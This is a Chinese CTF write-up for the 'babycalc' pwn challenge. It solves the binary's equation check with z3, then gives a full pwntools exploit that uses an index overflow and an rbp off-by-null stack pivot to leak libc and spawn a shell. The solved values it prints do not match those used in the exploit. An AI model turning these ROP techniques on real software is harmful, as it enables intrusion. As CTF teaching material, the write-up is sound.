---
title: XHLJ_babycalc
date: 2023-03-01 09:11:19
tags:
- Misc
- re
- ROP
- index overflow
- stackoverflow
categories: 
- pwn_wp
---

没给libc，差评。保护就开了个NX，看起来还挺友好的。

需要先用z3库解方程组，之后通过下标越界修改返回地址，并通过off-by-null覆盖rbp低位爆破栈迁移。

<!--more-->

```sh
[*] '/home/alphonse/CTF_GAME/XHLJ/babycalc/babycalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

主程序如下：

```c
  for ( i = 0; i <= 15; ++i )
  {
    printf("number-%d:", (unsigned int)(i + 1));
    buf[(int)read(0, buf, 0x100uLL)] = 0; //栈溢出 末尾0溢出
    v0 = strtol(buf, 0LL, 10);
    *(&v3 + i) = v0; //任意地址写
  }
  if ( v5 * v4 * v3 - v6 != 36182
    || v3 != 19
    || v5 * 19 * v4 + v6 != 36322
    || (v13 + v3 - v8) * v16 != 32835
    || (v4 * v3 - v5) * v6 != 44170
    || (v5 + v4 * v3) * v6 != 51590
    || v9 * v8 * v7 - v10 != 61549
    || v10 * v15 + v4 + v18 != 19037
    || v9 * v8 * v7 + v10 != 61871
    || (v8 * v7 - v9) * v10 != 581693
    || v11 != 50
    || (v9 + v8 * v7) * v10 != 587167
    || v13 * v12 * v11 - v14 != 1388499
    || v13 * v12 * v11 + v14 != 1388701
    || (v12 * v11 - v13) * v14 != 640138
    || (v11 * v5 - v16) * v12 != 321081
    || (v13 + v12 * v11) * v14 != 682962
    || v17 * v16 * v15 - v18 != 563565
    || v17 * v16 * v15 + v18 != 563571
    || v14 != 101
    || (v16 * v15 - v17) * v18 != 70374
    || (v17 + v16 * v15) * v18 != 70518 )
  {
    exit(0);
  }
  return puts("good done");
```

需要输入16次内容，每次都会输入`0x100`字节的内容，并且存在栈溢出，足够改写所有的变量，包括循环变量i。在这之后会使用`strtol(buf,0,10)`将字符串识别为一个**1个字节的十进制数**，并写到`*(&v3 + i)`，由于`v3`和`i`都可由栈溢出控制，这相当于我们可以**任意地址写一个字节**（如果i>15）。

除此之外`buf[(int)read(0, buf, 0x100uLL)] = 0;`会在`buf`之后写入一个`'\x00'`，可以**覆盖rbp的低字节**。

可以尝试一下栈迁移，先覆盖rbp的低字节为`'\x00'`，之后使用任意地址写将返回地址改为`leave ret`的地址。修改后的rbp有可能会指向我们的buf中，在buf中构造好ROP链，**爆破**一下估计就可以了。

不过为了让程序能够返回，我们要先绕过前面的判断条件。

```c
  if ( v5 * v4 * v3 - v6 != 36182
    || v3 != 19
    || v5 * 19 * v4 + v6 != 36322
    || (v13 + v3 - v8) * v16 != 32835
    || (v4 * v3 - v5) * v6 != 44170
    || (v5 + v4 * v3) * v6 != 51590
    || v9 * v8 * v7 - v10 != 61549
    || v10 * v15 + v4 + v18 != 19037
    || v9 * v8 * v7 + v10 != 61871
    || (v8 * v7 - v9) * v10 != 581693
    || v11 != 50
    || (v9 + v8 * v7) * v10 != 587167
    || v13 * v12 * v11 - v14 != 1388499
    || v13 * v12 * v11 + v14 != 1388701
    || (v12 * v11 - v13) * v14 != 640138
    || (v11 * v5 - v16) * v12 != 321081
    || (v13 + v12 * v11) * v14 != 682962
    || v17 * v16 * v15 - v18 != 563565
    || v17 * v16 * v15 + v18 != 563571
    || v14 != 101
    || (v16 * v15 - v17) * v18 != 70374
    || (v17 + v16 * v15) * v18 != 70518 )
  {
    exit(0);
  }
```

这相当于解一个方程组，官方wp是用py的z3库去算的。

```
v5 * v4 * v3 - v6 = 36182
v3 = 19
v5 * 19 * v4 + v6 = 36322
(v13 + v3 - v8) * v16 = 32835
(v4 * v3 - v5) * v6 = 44170
(v5 + v4 * v3) * v6 = 51590
v9 * v8 * v7 - v10 = 61549
v10 * v15 + v4 + v18 = 19037
v9 * v8 * v7 + v10 = 61871
(v8 * v7 - v9) * v10 = 581693
v11 = 50
(v9 + v8 * v7) * v10 = 587167
v13 * v12 * v11 - v14 = 1388499
v13 * v12 * v11 + v14 = 1388701
(v12 * v11 - v13) * v14 = 640138
(v11 * v5 - v16) * v12 = 321081
(v13 + v12 * v11) * v14 ! 682962
v17 * v16 * v15 - v18 = 563565
v17 * v16 * v15 + v18 = 563571
v14 = 101
(v16 * v15 - v17) * v18 = 70374
(v17 + v16 * v15) * v18 = 70518 
```

py脚本

```py
from z3 import*
v=[BitVec('v%d'%i,8) for i in range(16)]
s=Solver()
s.add(v[2] * v[1] * v[0] - v[3] == 36182)
s.add(v[0] == 19)
s.add(v[2] * v[0] * v[1] + v[3] == 36322)
s.add((v[10] + v[0] - v[5]) * v[13] == 32835)
s.add((v[1] * v[0] - v[2]) * v[3] == 44170)
s.add((v[2] + v[1] * v[0]) * v[3] == 51590)
s.add(v[6] * v[5] * v[4] - v[7] == 61549)
s.add(v[7] * v[12] + v[1] + v[15] == 19037)
s.add(v[6] * v[5] * v[4] + v[7] == 61871)
s.add((v[5] * v[4] - v[6]) * v[7] == 581693)
s.add(v[8] == 50)
s.add((v[6] + v[5] * v[4]) * v[7] == 587167)
s.add(v[10] * v[9] * v[8] - v[11] == 1388499)
s.add(v[10] * v[9] * v[8] + v[11] == 1388701)
s.add((v[9] * v[8] - v[10]) * v[11] == 640138)
s.add((v[8] * v[2] - v[13]) * v[9] == 321081)
s.add((v[10] + v[9] * v[8]) * v[11] == 682962)
s.add(v[14] * v[13] * v[12] - v[15] == 563565)
s.add(v[14] * v[13] * v[12] + v[15] == 563571)
s.add(v[11] == 101)
s.add((v[13] * v[12] - v[14]) * v[15] == 70374)
s.add((v[14] + v[13] * v[12]) * v[15] == 70518) 

if s.check() == sat:  
      m = s.model()  
      for i in range(16):  
          print hex(m[v[i]].as_long())
else:
	print("error")

```

解出结果为：

```
v3~v18
0x13
0xa4
0x75
0xc6
0x17
0x82
0x11
0x21
0x32
0x43
0x54
0x65
0xf6
0x7
0x18
0x3
```

之后就可以开始进行利用了，首先需要泄露libc，由于开启了`ASLR`，因此这一步需要爆破一下，使得低字节被覆盖为为`'\x00'`的rbp能指向`ROP链+0x8`的位置（leave会pop rbp，之后rsp会指向rbp+0x8），可以在前面填充`ret`提高命中率，最后需要返回`start`来调整栈帧。

泄露了libc之后就可以走`system("/bin/sh")`了，这一步同样需要爆破一下，使得能够`rsp`指向ROP链。**要注意system前调整栈对齐**。

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='babycalc'
elf=ELF('./'+filename)
libc = ELF("./libc.so.6")
p=process('./'+filename)
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

def pwn():
  p=process('./'+filename)

  try:

    #leave=0x0000000000400bb7
    ret=0x00000000004005b9
    pop_rdi=0x0000000000400ca3
    main_func=0x400789
    start_addr=0x400650

    # res to equation set
    calc_value=p8(19)
    calc_value+=p8(36)
    calc_value+=p8(53)
    calc_value+=p8(70)
    calc_value+=p8(55)
    calc_value+=p8(66)
    calc_value+=p8(17)
    calc_value+=p8(161)
    calc_value+=p8(50)
    calc_value+=p8(131)
    calc_value+=p8(212)
    calc_value+=p8(101)
    calc_value+=p8(118)
    calc_value+=p8(199)
    calc_value+=p8(24)
    calc_value+=p8(3)

    # overwrite value
    write_char='24' #0x18 ret_address=>leave
    payload=write_char
    payload=payload.ljust(0x48,'\x00')
    payload+=p64(ret)*0x6
    payload+=p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])
    payload+=p64(start_addr)

    payload=payload.ljust(0xd0,'a')

    payload+=calc_value


    payload=payload.ljust(0xfc,'c')
    payload+=p32(0x38) # i

  
    p.recvuntil('number-'+str(1)+':')

    p.send(payload)
    
    p.recvuntil("good done\n")

    puts_addr = u64(p.recvuntil('\x7f',timeout=1)[-6:].ljust(8,'\x00'))
    if puts_addr == 0:
      raise EOFError

    leak("puts_addr",hex(puts_addr))
    #calc libc base
    libcbase=puts_addr-libc.symbols['puts']
    leak('libcbase',hex(libcbase))
    sys_addr=libcbase+libc.symbols['system']
    binsh_addr=libcbase+libc.search('/bin/sh').next()
    leak('sys_addr',hex(sys_addr))
    leak('binsh_addr',hex(binsh_addr))

    # gdb.attach(p,'b *0x400bb7')
    # pause()

    #get shell 
    write_char=b'24' #0x18 ret_address=>leave
    payload=write_char
    payload=payload.ljust(0x48,'\x00')

    payload+=p64(ret)*0xd
    payload+=p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)
    # payload=payload.ljust(0xd0 - 0x20 + 8 - 0x10,'a')
    # payload+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)

    payload=payload.ljust(0xd0,'a')

    payload+=calc_value

    payload=payload.ljust(0xfc,'c')
    payload+=p32(0x38) # i

    p.recvuntil('number-'+str(1)+':')
    gdb.attach(p,'b *0x400bb7')
    p.send(payload)
    
    p.recvuntil("good done\n")

    p.interactive()
    return

  except EOFError as e:
    p.close()
    raise e

# pwn()
while True:
  try:
    pwn()
    break
  except EOFError as e:
    continue

```







